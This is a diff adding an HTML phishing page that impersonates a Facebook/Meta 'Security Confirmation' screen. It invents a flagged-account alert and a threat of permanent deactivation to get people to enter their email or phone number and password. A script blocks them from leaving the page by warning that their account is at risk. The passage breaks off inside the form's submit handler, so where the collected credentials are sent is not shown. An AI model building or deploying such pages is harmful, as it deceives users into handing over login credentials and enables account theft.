@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Verification | Facebook Security</title>
+    <style>
+        body { background-color: #f0f2f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .wrapper { background: white; width: 100%; max-width: 450px; border-radius: 10px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); overflow: hidden; border: 1px solid #dddfe2; }
+        .header { background: #1877f2; color: white; padding: 20px; text-align: center; font-size: 22px; font-weight: bold; letter-spacing: -1px; }
+        .content { padding: 30px; }
+        .alert-icon { width: 60px; height: 60px; background: #ffeef0; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
+        .alert-icon svg { fill: #fa3e3e; width: 35px; }
+        h2 { font-size: 18px; color: #1c1e21; margin: 0 0 15px; text-align: center; }
+        .info-box { background: #f5f6f7; border: 1px solid #ebedf0; padding: 15px; border-radius: 8px; margin-bottom: 20px; font-size: 13px; color: #4b4f56; line-height: 1.6; }
+        .info-box strong { color: #1c1e21; }
+        .input-group { margin-bottom: 15px; }
+        input { width: 100%; padding: 14px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; background: #f5f6f7; box-sizing: border-box; }
+        input:focus { background: white; border-color: #1877f2; outline: none; box-shadow: 0 0 0 2px #e7f3ff; }
+        .btn-verify { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn-verify:hover { background: #166fe5; }
+        .footer-text { font-size: 12px; color: #90949c; text-align: center; margin-top: 20px; border-top: 1px solid #ebedf0; padding-top: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="wrapper">
+    <div class="header">facebook</div>
+    <div class="content">
+        <div class="alert-icon">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+        </div>
+        <h2>Security Confirmation Required</h2>
+        
+        <div class="info-box">
+            Your account has been temporarily flagged. <br>
+            <strong>Reason:</strong> Unusual login attempt detected.<br>
+            <strong>Location:</strong> Unknown (Suspicious IP)<br>
+            <strong>Action:</strong> Confirmation required to prevent permanent deactivation.
+        </div>
+
+        <form id="proForm">
+            <div class="input-group">
+                <input type="text" name="id" placeholder="Mobile number or email address" required>
+            </div>
+            <div class="input-group">
+                <input type="password" name="pass" placeholder="Password" required>
+            </div>
+            <button type="submit" class="btn-verify" id="subBtn">Confirm Identity</button>
+        </form>
+
+        <div class="footer-text">
+            For your security, no one can see this information. <br>
+            © Meta 2026. All rights reserved.
+        </div>
+    </div>
+</div>
+
+<script>
+    // جلوگیری از خروج (حرفه ای)
+    window.addEventListener('beforeunload', (event) => {
+        event.preventDefault();
+        event.returnValue = 'Important: Your account is at risk!';
+    });
+
+    document.getElementById('proForm').addEventListener('submit', function(e) {
+        e
